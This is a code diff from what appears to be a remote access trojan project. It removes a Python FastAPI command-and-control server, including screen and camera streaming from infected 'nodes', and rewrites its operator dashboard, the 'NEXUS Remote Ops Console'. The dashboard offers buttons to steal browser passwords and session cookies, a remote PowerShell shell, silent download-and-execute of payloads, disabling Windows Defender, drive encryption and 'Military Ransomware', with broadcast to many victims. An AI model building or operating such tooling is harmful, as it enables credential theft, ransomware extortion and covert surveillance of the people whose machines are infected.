@@ -1,198 +1,12 @@
-import os
-import sys
-import time
-import json
-import asyncio
-import logging
-import base64
-import subprocess
-import shutil
-import socket
-import struct
-from contextlib import asynccontextmanager
-from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
-from collections import deque
-from fastapi.responses import HTMLResponse, PlainTextResponse, JSONResponse
-from fastapi.middleware.cors import CORSMiddleware
-import uvicorn
-
-logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s  %(message)s")
-logger = logging.getLogger("c2")
-logger.setLevel(logging.INFO)
-log_file = os.path.join(os.getcwd(), "server.log")
-file_handler = logging.FileHandler(log_file, encoding="utf-8")
-file_handler.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s %(message)s"))
-logger.addHandler(file_handler)
-
-CMD_REG = 0x4B
-CMD_VIEW = 0x15
-
-
-def _ws_payload(msg: dict):
-    """
-    Normalize Starlette websocket.receive() dict.
-    Returns ('bytes', data), ('text', data), or None when the client disconnected.
-    Must stop calling receive() after None — otherwise Starlette raises RuntimeError.
-    """
-    t = msg.get("type", "")
-    if t == "websocket.disconnect":
-        return None
-    if t != "websocket.receive":
-        return ("skip", None)
-    if msg.get("bytes") is not None:
-        return ("bytes", msg["bytes"])
-    if msg.get("text") is not None:
-        return ("text", msg["text"])
-    return ("skip", None)
-
-
-_udp_server_transport = None
-
-async def _udp_handler():
-    global _udp_server_transport
-    try:
-        loop = asyncio.get_event_loop()
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 524288)
-        sock.bind(("0.0.0.0", 1000))
-        sock.setblocking(False)
-
-        class UDPProtocol(asyncio.DatagramProtocol):
-            def datagram_received(self, data: bytes, addr):
-                try:
-                    if len(data) < 42:
-                        return
-                    device_id = data[:36].decode("ascii", errors="replace")
-                    seq = struct.unpack("<I", data[36:40])[0]
-                    frame_type = data[40]
-                    total = data[41]
-                    idx = data[42]
-                    payload = data[43:]
-                    if device_id not in state.clients:
-                        return
-                    session = state.clients[device_id]
-                    viewers = session.cam_viewers if frame_type == 0x02 else session.viewers
-                    for v in list(viewers):
-                        try:
-                            asyncio.ensure_future(v.send_bytes(data))
-                        except Exception:
-                            viewers.discard(v)
-                except Exception:
-                    pass
-
-        transport, _ = await loop.create_datagram_endpoint(
-            lambda: UDPProtocol(), sock=sock
-        )
-        _udp_server_transport = transport
-        logger.info("UDP stream listener started on port 1000")
-    except Exception as ex:
-        logger.warning(f"UDP listener failed: {ex}")
-
-@asynccontextmanager
-async def lifespan(app: FastAPI):
-    os.makedirs("downloads", exist_ok=True)
-    task = asyncio.create_task(_udp_handler())
-    yield
-    task.cancel()
-    try:
-        await task
-    except:
-        pass
-    if _udp_server_transport:
-        _udp_server_transport.close()
-
-app = FastAPI(lifespan=lifespan)
-app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
-
-
-class ClientSession:
-    def __init__(self, ws: WebSocket, info: dict):
-        self.ws = ws
-        self.info = info
-        self.viewers = set()
-        self.cam_viewers = set()
-        self.camera_ws = None
-        self.udp_addr = None
-        self.last_seen = time.time()
-        self.created = time.time()
-        self._agent_send_lock = asyncio.Lock()
-        self._broadcast_tasks = set()
-
-    async def agent_send_bytes(self, data: bytes):
-        async with self._agent_send_lock:
-            await self.ws.send_bytes(data)
-
-    async def agent_send_text(self, text: str):
-        async with self._agent_send_lock:
-            await self.ws.send_text(text)
-
-    async def broadcast_bytes(self, payload: bytes):
-        """Fan-out bytes to all viewers concurrently."""
-        tasks = []
-        for v in list(self.viewers):
-            tasks.append(self._send_to_viewer_bytes(v, payload))
-        if tasks:
-            self._broadcast_tasks.update(tasks)
-            await asyncio.gather(*tasks, return_exceptions=True)
-            self._broadcast_tasks.difference_update(tasks)
-
-    async def _send_to_viewer_bytes(self, v, payload: bytes):
-        try:
-            await v.send_bytes(payload)
-        except Exception:
-            self.viewers.discard(v)
-
-    async def broadcast_text(self, data: dict):
-        """Fan-out text to all viewers concurrently."""
-        tasks = []
-        for v in list(self.viewers):
-            tasks.append(self._send_to_viewer_text(v, data))
-        if tasks:
-            self._broadcast_tasks.update(tasks)
-            await asyncio.gather(*tasks, return_exceptions=True)
-            self._broadcast_tasks.difference_update(tasks)
-
-    async def _send_to_viewer_text(self, v, data: dict):
-        try:
-            await v.send_json(data)
-        except Exception:
-            self.viewers.discard(v)
-
-    async def broadcast_cam_bytes(self, payload: bytes):
-        """Fan-out camera bytes to cam_viewers concurrently."""
-        tasks = []
-        for v in list(self.cam_viewers):
-            tasks.append(self._send_to_cam_viewer(v, payload))
-        if tasks:
-            await asyncio.gather(*tasks, return_exceptions=True)
-
-    async def _send_to_cam_viewer(self, v, payload: bytes):
-        try:
-            await v.send_bytes(payload)
-        except Exception:
-            self.cam_viewers.discard(v)
-
-    @property
-    def is_alive(self):
-        return time.time() - self.last_seen < 120
-
-
-class ServerState:
-    def __init__(self):
-        self.clients = {}
-
-
-state = ServerState()
-_broadcast_results = {}  # device_id -> [output lines]
-
-# ─── Dashboard HTML ───────────────────────────────────────────
-DASHBOARD = """<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="pragma" content="no-cache">
+<meta http-equiv="expires" content="0">
 <title>NEXUS · Remote Ops Console</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&family=Orbitron:wght@500;600;700;800&display=swap" rel="stylesheet">
 <style>
 :root{
   --gold:#f5d742;--cyan:#00f5ff;--magenta:#ff2ea6;--violet:#9d7bff;
@@ -200,10 +14,12 @@ DASHBOARD = """<!DOCTYPE html>
   --green:#3dff9d;--red:#ff4d7d;--blue:#4db8ff;--text:#e8f0ff;--muted:#7a8aa8;
   --glass:linear-gradient(145deg,rgba(20,28,48,.95),rgba(8,10,20,.88));
   --ps-w:360px;
+  --term-fs:12px;
+  --term-fs-pop:11px;
 }
 *{box-sizing:border-box;margin:0;padding:0}
 body{
-  font-family:'Inter',system-ui,sans-serif;
+  font-family:'Segoe UI',system-ui,sans-serif;
   background:var(--bg);color:var(--text);
   display:flex;flex-direction:column;height:100vh;overflow:hidden;
   position:relative;
@@ -230,14 +46,14 @@ body::after{
   display:flex;align-items:center;padding:0 14px;gap:8px;z-index:100;
 }
 #topnav .logo{
-  font-family:'Orbitron',sans-serif;font-size:12px;font-weight:800;letter-spacing:4px;
+  font-family:'Consolas','Segoe UI',sans-serif;font-size:12px;font-weight:800;letter-spacing:4px;
   background:linear-gradient(90deg,var(--cyan),var(--gold));-webkit-background-clip:text;background-clip:text;color:transparent;
   margin-right:14px;white-space:nowrap;text-shadow:0 0 40px rgba(0,245,255,.3);
 }
 #node_tag{
   color:var(--cyan);font-weight:700;font-size:12px;margin-right:16px;padding:5px 14px;
   background:rgba(0,245,255,.08);border:1px solid rgba(0,245,255,.35);border-radius:999px;display:none;
-  font-family:'JetBrains Mono',monospace;box-shadow:0 0 20px rgba(0,245,255,.15);
+  font-family:'Consolas','Courier New',monospace;box-shadow:0 0 20px rgba(0,245,255,.15);
 }
 
 /* Combo Dropdown */
@@ -272,21 +88,26 @@ body::after{
 #wrap{flex:1;display:flex;overflow:hidden}
 
 #sidebar{width:268px;background:var(--glass);backdrop-filter:blur(10px);border-right:1px solid var(--border);display:flex;flex-direction:column;box-shadow:4px 0 32px rgba(0,0,0,.25)}
-#sidebar h2{padding:14px 16px;font-family:'Orbitron',sans-serif;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:4px;color:var(--cyan);border-bottom:1px solid var(--border)}
+#sidebar h2{padding:14px 16px;  font-family:'Consolas','Segoe UI',sans-serif;font-size:9px;font-weight:800;text-transform:uppercase;letter-spacing:4px;color:var(--cyan);border-bottom:1px solid var(--border)}
 #clist{flex:1;overflow-y:auto;padding:8px}
 
 .nd{padding:12px 14px;background:rgba(20,24,42,.75);margin-bottom:8px;border-radius:10px;cursor:pointer;border:1px solid rgba(0,245,255,.12);transition:.2s;position:relative;overflow:hidden}
 .nd:hover{border-color:rgba(0,245,255,.4);box-shadow:0 0 20px rgba(0,245,255,.08)}
 .nd.act{border-color:var(--cyan);background:rgba(0,245,255,.06);box-shadow:0 0 24px rgba(0,245,255,.12)}
+.nd.offline{border-color:rgba(120,120,140,.15);opacity:.55}
+.nd.offline::before{background:linear-gradient(180deg,#555,#333)}
+.nd.offline:hover{opacity:.8;border-color:rgba(120,120,140,.3)}
 .nd::before{content:'';position:absolute;left:0;top:0;height:100%;width:3px;background:linear-gradient(180deg,var(--cyan),var(--magenta));border-radius:3px 0 0 3px}
-.nd b{color:#fff;font-size:12px;font-weight:700;font-family:'JetBrains Mono',monospace}
+.nd b{color:#fff;font-size:12px;font-weight:700;font-family:'Consolas','Courier New',monospace}
 .nd .os{color:var(--muted);font-size:10px;margin-top:4px;display:block}
 .bg{font-size:8px;font-weight:800;padding:3px 10px;border-radius:20px;background:rgba(61,255,157,.12);color:var(--green);margin-top:6px;display:inline-block;letter-spacing:.6px;text-transform:uppercase;border:1px solid rgba(61,255,157,.25)}
-.es{padding:30px;color:#333;font-size:11px;text-align:center;font-weight:600}
+.bg.offline-badge{background:rgba(120,120,140,.1);color:#888;border-color:rgba(120,120,140,.2)}
+.last-seen{display:block;font-size:9px;color:#666;margin-top:2px}
+.es{padding:30px;color:var(--muted);font-size:12px;text-align:center;font-weight:600;letter-spacing:1px}
 
 #stage{flex:1;display:flex;overflow:hidden;min-height:0}
 #cvw{flex:1;min-width:100px;background:#020208;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow:hidden;position:relative;border-right:1px solid rgba(0,245,255,.1)}
-#vlbl{position:absolute;top:12px;left:12px;font-size:10px;font-weight:800;padding:6px 12px;border-radius:6px;background:rgba(0,8,16,.85);color:var(--cyan);text-transform:uppercase;letter-spacing:2px;z-index:5;font-family:'Orbitron',sans-serif;border:1px solid rgba(0,245,255,.25)}
+#vlbl{position:absolute;top:12px;left:12px;font-size:10px;font-weight:800;padding:6px 12px;border-radius:6px;background:rgba(0,8,16,.85);color:var(--cyan);text-transform:uppercase;letter-spacing:2px;z-index:5;font-family:'Consolas','Segoe UI',sans-serif;border:1px solid rgba(0,245,255,.25)}
 canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12px rgba(0,245,255,.06))}
 
 #rp{
@@ -297,7 +118,7 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 }
 .th{
   flex-shrink:0;padding:8px 10px;background:rgba(0,40,56,.5);font-size:10px;font-weight:800;border-bottom:1px solid rgba(0,245,255,.2);
-  color:var(--cyan);display:flex;align-items:center;gap:8px;justify-content:space-between;font-family:'Orbitron',sans-serif;letter-spacing:1px;
+  color:var(--cyan);display:flex;align-items:center;gap:8px;justify-content:space-between;font-family:'Consolas','Segoe UI',sans-serif;letter-spacing:1px;
 }
 .th .th-left{display:flex;align-items:center;gap:8px}
 .th .dot{width:8px;height:8px;border-radius:50%;background:var(--cyan);box-shadow:0 0 10px var(--cyan);animation:pulse 2s ease infinite}
@@ -305,21 +126,22 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 .ps-tools{display:flex;align-items:center;gap:4px}
 .ps-rbtn{
   width:28px;height:26px;border-radius:6px;border:1px solid rgba(0,245,255,.35);background:rgba(0,20,30,.8);
-  color:var(--cyan);font-size:16px;font-weight:700;cursor:pointer;line-height:1;padding:0;font-family:'JetBrains Mono',monospace;
+  color:var(--cyan);font-size:16px;font-weight:700;cursor:pointer;line-height:1;padding:0;font-family:'Consolas','Courier New',monospace;
   transition:.15s;
 }
 .ps-rbtn:hover{background:rgba(0,245,255,.15);color:#fff}
 #term{
-  flex:1;min-height:120px;padding:12px;background:#040a12;font-family:'JetBrains Mono','Consolas',monospace;font-size:clamp(10px,1.1vw,12px);
-  overflow-y:auto;color:#b8e8ff;line-height:1.55;white-space:pre-wrap;border-left:2px solid rgba(0,245,255,.15);
+  flex:1;min-height:120px;padding:12px;background:#040a12;
+  font-family:'Consolas','Courier New',monospace;
+  font-size:var(--term-fs);
+  overflow-y:auto;color:#b8e8ff;line-height:1.55;white-space:pre-wrap;word-break:break-all;border-left:2px solid rgba(0,245,255,.15);
 }
+#term .run-dot{color:var(--green);animation:pulse 1s ease infinite;display:inline-block}
+#termPop .run-dot{color:var(--violet);animation:pulse 1s ease infinite;display:inline-block}
 .ti{background:rgba(0,28,42,.9);border-top:1px solid rgba(0,245,255,.2);padding:8px 10px;display:flex;align-items:center;gap:6px}
-.ti span{color:var(--green);font-family:'JetBrains Mono',monospace;font-weight:700;font-size:11px;flex-shrink:0}
-.ti input{background:rgba(0,0,0,.35);border:1px solid rgba(0,245,255,.2);border-radius:6px;color:#f0ffff;flex:1;outline:0;font-family:'JetBrains Mono',monospace;font-size:11px;padding:8px 10px}
+.ti span{color:var(--green);font-family:'Consolas','Courier New',monospace;font-weight:700;font-size:11px;flex-shrink:0}
+.ti input{background:rgba(0,0,0,.35);border:1px solid rgba(0,245,255,.2);border-radius:6px;color:#f0ffff;flex:1;outline:0;font-family:'Consolas','Courier New',monospace;font-size:11px;padding:8px 10px}
 .ti input:focus{border-color:var(--cyan);box-shadow:0 0 12px rgba(0,245,255,.12)}
-.ti-extra{display:flex;align-items:center;padding:0 6px;gap:4px}
-.ti-extra .bsm{background:none;border:none;color:var(--muted);cursor:pointer;font-size:13px;padding:2px 6px;border-radius:3px;line-height:1}
-.ti-extra .bsm:hover{color:#fff;background:rgba(255,255,255,.08)}
 
 /* Modals */
 .ov{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(2,4,12,.72);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:500;padding:16px}
@@ -329,12 +151,12 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 #termm .mb.mb-term{display:flex;flex-direction:column;height:min(70vh,580px);max-height:86vh;min-height:280px}
 #termm .mb.mb-term #termPop{flex:1;min-height:0}
 .mh{padding:12px 16px;background:rgba(0,30,48,.6);display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(0,245,255,.2);gap:10px;flex-wrap:wrap}
-.mh span{font-weight:800;font-size:13px;font-family:'Orbitron',sans-serif;color:var(--cyan);letter-spacing:.5px}
+.mh span{font-weight:800;font-size:13px;font-family:'Consolas','Segoe UI',sans-serif;color:var(--cyan);letter-spacing:.5px}
 .mh .mh-actions{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
 .mh button{background:rgba(0,245,255,.12);border:1px solid rgba(0,245,255,.35);color:var(--cyan);padding:6px 12px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;transition:.15s;font-family:inherit}
 .mh button:hover{background:rgba(0,245,255,.22);color:#fff}
 .mc{flex:1;overflow-y:auto;padding:16px;min-height:0}
-.brc{padding:10px 14px;background:rgba(0,8,20,.9);border-bottom:1px solid rgba(0,245,255,.15);font-size:11px;font-family:'JetBrains Mono',monospace;color:var(--cyan);word-break:break-all}
+.brc{padding:10px 14px;background:rgba(0,8,20,.9);border-bottom:1px solid rgba(0,245,255,.15);font-size:11px;font-family:'Consolas','Courier New',monospace;color:var(--cyan);word-break:break-all}
 
 .fi{padding:10px 12px;border-bottom:1px solid rgba(0,245,255,.08);display:flex;align-items:center;transition:.12s;gap:8px;flex-wrap:wrap}
 .fi:hover{background:rgba(0,245,255,.04)}
@@ -345,15 +167,15 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 .bsm-term{border-color:rgba(157,123,255,.5)!important;color:#dcc6ff!important}
 .bsm-term:hover{border-color:var(--violet)!important;color:#fff!important}
 
-#termPop{flex:1;min-height:160px;padding:12px;background:#030810;font-family:'JetBrains Mono',monospace;font-size:11px;overflow-y:auto;color:#c5f0ff;line-height:1.55;white-space:pre-wrap;border-top:1px solid rgba(0,245,255,.12)}
+#termPop{flex:1;min-height:160px;padding:12px;background:#030810;font-family:'Consolas','Courier New',monospace;font-size:var(--term-fs-pop);overflow-y:auto;color:#c5f0ff;line-height:1.55;white-space:pre-wrap;border-top:1px solid rgba(0,245,255,.12)}
 .ti-pop{background:rgba(0,24,36,.95);border-top:1px solid rgba(157,123,255,.25);padding:8px 10px;display:flex;align-items:center;gap:8px}
-.ti-pop span{color:var(--violet);font-family:'JetBrains Mono',monospace;font-weight:700;font-size:11px}
-.ti-pop input{flex:1;background:rgba(0,0,0,.4);border:1px solid rgba(157,123,255,.3);border-radius:6px;color:#fff;padding:8px 10px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:0}
-.term-path{font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;max-width:100%;overflow:hidden;text-overflow:ellipsis}
+.ti-pop span{color:var(--violet);font-family:'Consolas','Courier New',monospace;font-weight:700;font-size:11px}
+.ti-pop input{flex:1;background:rgba(0,0,0,.4);border:1px solid rgba(157,123,255,.3);border-radius:6px;color:#fff;padding:8px 10px;font-family:'Consolas','Courier New',monospace;font-size:11px;outline:0}
+.term-path{font-size:10px;color:var(--muted);font-family:'Consolas','Courier New',monospace;max-width:100%;overflow:hidden;text-overflow:ellipsis}
 
 .btn{
   background:linear-gradient(135deg,var(--cyan),#00a8c6);border:0;color:#02040a;padding:9px 18px;border-radius:8px;cursor:pointer;font-weight:800;font-size:11px;
-  text-transform:uppercase;letter-spacing:.6px;font-family:'Orbitron',sans-serif;transition:.18s;box-shadow:0 4px 20px rgba(0,245,255,.25);
+  text-transform:uppercase;letter-spacing:.6px;font-family:'Consolas','Segoe UI',sans-serif;transition:.18s;box-shadow:0 4px 20px rgba(0,245,255,.25);
 }
 .btn:hover{filter:brightness(1.08);transform:translateY(-1px);box-shadow:0 6px 28px rgba(0,245,255,.35)}
 .bsm{background:rgba(20,26,48,.9);border:1px solid rgba(0,245,255,.2);color:#c8deff;padding:5px 10px;border-radius:6px;cursor:pointer;font-size:10px;font-family:inherit;transition:.15s;font-weight:600}
@@ -362,10 +184,10 @@ canvas{max-width:100%;max-height:100%;cursor:crosshair;filter:drop-shadow(0 0 12
 .bng{background:linear-gradient(135deg,var(--green),#00c978);color:#020808;border:0}
 input[type=text]{background:rgba(0,12,24,.6);border:1px solid rgba(0,245,255,.2);color:#fff;padding:10px 14px;border-radius:8px;width:100%;margin:8px 0;font-size:13px;font-family:inherit}
 input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2px rgba(0,245,255,.12)}
-.status-panel{padding:10px 12px;margin:8px;border-radius:10px;background:rgba(0,40,32,.35);border:1px solid rgba(61,255,157,.2);color:#9effd0;font-size:12px;font-family:'JetBrains Mono',monospace}
+.status-panel{padding:10px 12px;margin:8px;border-radius:10px;background:rgba(0,40,32,.35);border:1px solid rgba(61,255,157,.2);color:#9effd0;font-size:12px;font-family:'Consolas','Courier New',monospace}
 .log-panel{margin:8px;border:1px solid rgba(0,245,255,.15);border-radius:10px;background:rgba(4,8,16,.9);overflow:hidden;flex-shrink:0}
-.log-panel .log-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(0,24,36,.6);color:var(--cyan);font-size:11px;font-family:'Orbitron',sans-serif;font-weight:700}
-.log-panel pre{margin:0;padding:12px;font-family:'JetBrains Mono',monospace;font-size:10px;line-height:1.45;color:#a8e8ff;background:#02060c;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word}
+.log-panel .log-header{display:flex;align-items:center;justify-content:space-between;padding:8px 12px;background:rgba(0,24,36,.6);color:var(--cyan);font-size:11px;font-family:'Consolas','Segoe UI',sans-serif;font-weight:700}
+.log-panel pre{margin:0;padding:12px;font-family:'Consolas','Courier New',monospace;font-size:10px;line-height:1.45;color:#a8e8ff;background:#02060c;max-height:200px;overflow-y:auto;white-space:pre-wrap;word-wrap:break-word}
 @media (max-width:900px){
   #sidebar{width:220px}
   #rp{min-width:200px}
@@ -383,7 +205,7 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
 
 <!-- TOP NAV -->
 <div id="topnav">
-    <div class="logo">BABY RAT 🐀 </div>
+    <div class="logo">NEXUS</div>
     <span id="node_tag"></span>
 
     <div class="combo">
@@ -400,7 +222,6 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
         <div class="combo-panel">
             <a onclick="sc(0x30)"><span class="ci">🔓</span> Browser Passwords</a>
             <a onclick="sc(0x32)"><span class="ci">🍪</span> Session Cookies</a>
-            <a onclick="openM('keym')"><span class="ci">🔑</span> Inject RSA Key</a>
         </div>
     </div>
 
@@ -414,15 +235,9 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
             <a onclick="doLock()"><span class="ci">🔒</span> Lock Device</a>
             <a onclick="doEnc()" class="danger"><span class="ci">🔐</span> Vault Encryption</a>
             <a onclick="doDec()" style="color:#00e676;"><span class="ci">🔓</span> Vault Decryption</a>
-        </div>
-    </div>
-
-    <div class="combo">
-        <button class="combo-btn" style="border-color:var(--magenta);color:var(--magenta)"><span class="ci">☠️</span> Warfare</button>
-        <div class="combo-panel">
-            <a onclick="doRansom()" class="danger"><span class="ci">💀</span> Deploy Ransomware</a>
-            <a onclick="doUnlockRansom()" style="color:#00e676;"><span class="ci">🔓</span> Unlock Ransomware</a>
-            <a onclick="doDefender()"><span class="ci">🛡️</span> Disable Defender</a>
+            <a onclick="openM('runm')"><span class="ci">▶️</span> Run Program</a>
+            <a onclick="doDisableDefender()" class="danger"><span class="ci">🛡️</span> Kill Windows Defender</a>
+            <a onclick="doRansomware()" style="color:#ff2a2a;"><span class="ci">☢️</span> Military Ransomware</a>
         </div>
     </div>
 
@@ -443,6 +258,13 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
     <h2>◆ NODE MESH</h2>
     <div id="clist"><div class="es">AWAITING NODES...</div></div>
     <div class="status-panel" id="statusBar">Status: awaiting nodes...</div>
+    <div id="disconnectBar" style="display:none;padding:4px 12px 8px">
+        <button onclick="doDisconnect()" style="width:100%;background:rgba(255,77,125,.15);color:#ff4d7d;border:1px solid rgba(255,77,125,.3);border-radius:6px;padding:6px;cursor:pointer;font-size:10px;font-weight:700;font-family:inherit">✕ Disconnect from current node</button>
+    </div>
+    <div style="padding:6px 12px 8px;display:flex;gap:4px;flex-wrap:wrap">
+        <button onclick="toggleAllChecks()" style="background:rgba(0,245,255,.08);border:1px solid rgba(0,245,255,.2);color:var(--cyan);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:9px;font-weight:600">☐ All</button>
+        <button onclick="openM('bcm')" style="background:rgba(255,46,166,.12);border:1px solid rgba(255,46,166,.3);color:var(--magenta);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:9px;font-weight:600">📡 Broadcast</button>
+    </div>
     <div class="log-panel">
         <div class="log-header"><span>Server Logs</span><button class="bsm" onclick="loadLogs()">Refresh</button></div>
         <pre id="logArea">Loading logs...</pre>
@@ -459,14 +281,16 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
         <div class="th">
             <div class="th-left"><div class="dot"></div> REMOTE SHELL</div>
             <div class="ps-tools" title="Panel width">
+                <button type="button" class="ps-rbtn" onclick="termFs(-1)" title="Smaller text">A−</button>
+                <button type="button" class="ps-rbtn" onclick="termFs(1)" title="Larger text">A+</button>
+                <button type="button" class="ps-rbtn" onclick="termScrollLock()" id="slBtn" title="Auto-scroll toggle">⤓</button>
                 <button type="button" class="ps-rbtn" onclick="resizePs(-48)" title="Narrower">−</button>
                 <button type="button" class="ps-rbtn" onclick="resizePs(48)" title="Wider">+</button>
                 <button type="button" class="ps-rbtn" onclick="resizePs(0)" title="Reset width">↺</button>
             </div>
         </div>
-        <div id="term">Awaiting connection...\\n</div>
-        <div class="ti"><span>PS&gt;</span><input id="sh" onkeydown="_shKeydown(event,_shHist.arr,_shHist,doSh,clearTerm,at)" placeholder="PowerShell command..." autocomplete="off" spellcheck="false"></div>
-        <div class="ti-extra"><button class="bsm" onclick="clearTerm()" title="Clear terminal">🗑️</button></div>
+        <div id="term">Awaiting connection...\n</div>
+        <div class="ti"><span>PS&gt;</span><input id="sh" onkeydown="if(event.key==='Enter')doSh()" placeholder="PowerShell command..." autocomplete="off" spellcheck="false"></div>
     </div>
 </div>
 
@@ -492,7 +316,6 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
     <div class="mb mb-term" onclick="event.stopPropagation()">
         <div class="mh">
             <span>⚡ Folder PowerShell</span>
-            <button type="button" class="bsm" onclick="clearTermPop()" title="Clear terminal">🗑️</button>
             <button type="button" onclick="closeM('termm')">✕ Close</button>
         </div>
         <div class="brc"><span class="term-path" id="termPathLabel" title="Working directory on target"></span></div>
@@ -500,7 +323,7 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
 </div>
         <div class="ti-pop">
             <span>PS&gt;</span>
-            <input id="shPop" onkeydown="_shKeydown(event,_shPopHist.arr,_shPopHist,doShPop,clearTermPop,atPop)" placeholder="Command in this folder..." autocomplete="off" spellcheck="false">
+            <input id="shPop" onkeydown="if(event.key==='Enter')doShPop()" placeholder="Command in this folder..." autocomplete="off" spellcheck="false">
         </div>
     </div>
 </div>
@@ -523,6 +346,27 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
             <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Download and execute a file silently on target:</p>
             <input type="text" id="di" placeholder="https://example.com/payload.exe">
             <button class="btn" onclick="doDl()" style="margin-top:12px;width:100%">⚡ Download & Execute</button>
+        </div>
+    </div>
+</div>
+
+<div id="runm" class="ov" onclick="if(event.target===this)closeM('runm')">
+    <div class="mb" style="max-width:550px">
+        <div class="mh"><span>▶️ Run Program / Payload</span><button onclick="closeM('runm')">✕ Close</button></div>
+        <div class="mc">
+            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Download and execute a remote payload, or run a local file:</p>
+            <input type="text" id="runUrl" placeholder="https://example.com/payload.exe" style="margin-bottom:4px">
+            <input type="text" id="runArgs" placeholder="Arguments (optional)" style="margin-bottom:4px">
+            <label style="display:flex;align-items:center;gap:8px;color:var(--muted);font-size:12px;margin:8px 0;cursor:pointer">
+                <input type="checkbox" id="runTerminal" checked> Show output in terminal
+            </label>
+            <div style="display:flex;gap:8px">
+                <button class="btn" onclick="doDlEx()" style="flex:1">⬇ Download & Run from URL</button>
+            </div>
+            <hr style="border-color:var(--border);margin:16px 0">
+            <p style="color:var(--muted);font-size:12px;margin-bottom:8px">Or run a file already on the target:</p>
+            <input type="text" id="runLocalPath" placeholder="C:/path/to/file.exe" style="margin-bottom:4px">
+            <button class="btn" onclick="doRunLocalExe()" style="width:100%">▶ Run Local File</button>
         </div>
     </div>
 </div>
@@ -553,34 +397,44 @@ input[type=text]:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 2p
 </div>
 
 <div id="vm" class="ov" onclick="if(event.target===this)closeM('vm')">
-    <div class="mb">
-        <div class="mh"><span>🔑 Credential Vault</span><button onclick="closeM('vm')">✕ Close</button></div>
-        <div class="mc"><pre id="vd" style="color:var(--green);font-family:monospace;white-space:pre-wrap"></pre></div>
-    </div>
-</div>
-
-<div id="keym" class="ov" onclick="if(event.target===this)closeM('keym')">
-    <div class="mb" style="max-width:600px">
-        <div class="mh"><span>🔑 RSA Key Injection</span><button onclick="closeM('keym')">✕ Close</button></div>
+    <div class="mb" style="max-width:800px">
+        <div class="mh"><span>🔑 Key Vault & Credentials</span>
+            <div style="display:flex;gap:8px">
+                <button class="bsm" onclick="loadKeys()">🔄 Refresh Keys</button>
+                <button onclick="closeM('vm')">✕ Close</button>
+            </div>
+        </div>
         <div class="mc">
-            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Paste the RSA private key (PEM) to inject into the agent. Required before decryption or ransomware unlock.</p>
-            <textarea id="keyInput" rows="12" style="width:100%;background:#0a0a16;color:var(--green);border:1px solid var(--border);border-radius:4px;padding:10px;font-family:'JetBrains Mono',monospace;font-size:12px;resize:vertical" placeholder="-----BEGIN RSA PRIVATE KEY-----&#10;..."></textarea>
-            <button class="btn" onclick="injectKey()" style="margin-top:12px;width:100%">🔑 Inject Key to Agent</button>
+            <div id="keyList" style="margin-bottom:16px">
+                <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🔑 Stored Private Keys</h3>
+                <div id="keyItems" style="color:var(--muted);font-size:12px">Loading keys...</div>
+            </div>
+            <hr style="border-color:var(--border);margin:12px 0">
+            <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🔓 Decryption Tools</h3>
+            <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px">
+                <button class="btn" onclick="doEnc()" title="Encrypt all drives with embedded public key">🔐 Encrypt All Drives</button>
+                <button class="btn bng" onclick="doDec()" title="Decrypt all drives using stored key">🔓 Decrypt All Drives</button>
+                <button class="btn br" onclick="doRansomware()" style="background:linear-gradient(135deg,#ff2a2a,#aa0000)">☢️ Ransomware</button>
+                <button class="btn" onclick="doUnlockRansom()" title="Unlock ransomware after key injection">🔓 Unlock Ransomware</button>
+            </div>
+            <hr style="border-color:var(--border);margin:12px 0">
